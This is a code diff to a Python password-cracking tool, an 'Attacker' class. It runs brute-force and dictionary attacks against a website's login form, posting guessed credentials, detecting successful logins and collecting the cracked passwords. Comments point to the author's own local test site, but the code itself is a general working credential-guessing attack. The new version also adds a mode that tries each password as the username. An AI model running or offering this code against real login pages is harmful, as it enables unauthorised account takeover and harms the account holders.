@@ -3,20 +3,19 @@ import requests
 
 
 class Attacker():
-    def __init__(self, url, username="username", testMode=True, verbose=False, formTags=["Username", "Password"],
+    def __init__(self, loginURL, logoutURL, testMode=True, verbose=False, formTags=["Username", "Password"],
                  attackMethods={"BruteForceAttack":BruteForceAttack(), "DictionaryAttack":DictionaryAttack()}):
 
         # url of the login page
-        self.url = url
+        self.loginURL = loginURL
+
+        self.logoutURL = logoutURL
 
         # test mode doesn't send the login requests, just gets the passwords
         self.testMode = testMode
 
         # prints EVERYTHING out.
         self.verbose = verbose
-
-        # username of account we are trying to hack
-        self.username = username
 
         # Layout of the login form. You can check this through inspect element. Or if you built the website you can check the code!
         self.formTags = formTags
@@ -27,8 +26,8 @@ class Attacker():
         #   "Password" : "password",
         # }
         self.data = {
-            formTags[0] : self.username, # username of who we are tyring to hack
-            formTags[1] : "password" # dummmy password
+            formTags[0] : None, # form id for username
+            formTags[1] : None # form id for password
         }
 
         # list of attack methods
@@ -39,10 +38,12 @@ class Attacker():
     # successful is a function that the user provides that returns whether the login succeeded or not.
     # def successful(response) -> Boolean
     # this will change for depending on how the website is constructed. For mine just check that "HELLO" is present in response.content
-    def runAttack(self, checkSuccess, attackMethods=None):
-        print("ATTACKING", self.url)
+    def runAttack(self, checkSuccess, attackMethods=None, username=None, findAll=False):
+        print("ATTACKING", self.loginURL)
 
-        pw = "NOT FOUND"
+        # stores password've we cracked
+        foundPasswords = set({})
+
         # can specify which attack methods to use
         # if not specified, use all that are loaded in
         if not attackMethods:
@@ -52,9 +53,12 @@ class Attacker():
 
 
             for name, attackMethod in self.attackMethods.items():
+
                 if name not in attackMethods:
                     continue
+
                 print("===========================================================================\n" + str(attackMethod))
+
                 n = 0
                 for password in attackMethod.generatePasswords():
                     n += 1
@@ -62,21 +66,38 @@ class Attacker():
                         if self.verbose:
                             print("TEST MODE: generated password [%s]" % password)
                         continue
-                    self.data[self.formTags[1]] = password
-                    response = session.post(self.url, data=self.data)
+
+                    # if username is not passed as argument, we will user the password as our username
+                    self.setDataFields(username, password)
+
+                    response = session.post(self.loginURL, data=self.data)
                     found = checkSuccess(response)
 
                     if self.verbose:
-                        print("Trying [%s] [%s] ... %s" % (self.username, password,
-                                                       "SUCCESS" if found else "FAILED"))
+                        print("Trying [%s] ... %s" % (password, "SUCCESS" if found else "FAILED"))
 
                     if found:
-                        pw = password
-                        break
-                print("%s generated %d passwords. Found password to be <%s>" % (name, n, pw))
+                        foundPasswords.add(password)
+
+                        # if we are just brute forcing a single username exit after we found it
+                        if not findAll:
+                            break
+
+
+
+                    session.get("http://127.0.0.1:5000/logout")
+
+                print("%s generated %d passwords. Found %d password:" % (name, n, len(foundPasswords)))
+                for pw in foundPasswords:
+                    print(pw)
+
                 print("===========================================================================\n")
 
-        return pw
+        return foundPasswords
+
+    def setDataFields(self, username, password):
+        self.data[self.formTags[0]] = username or password
+        self.data[self.formTags[1]] = password
 
     def getPasswords(self):
         result = []
@@ -93,5 +114,3 @@ class Attacker():
         if method in self.attackMethods:
             return self.attackMethods[method]
 
-    def changeURL(self, url):
-        self.url = url
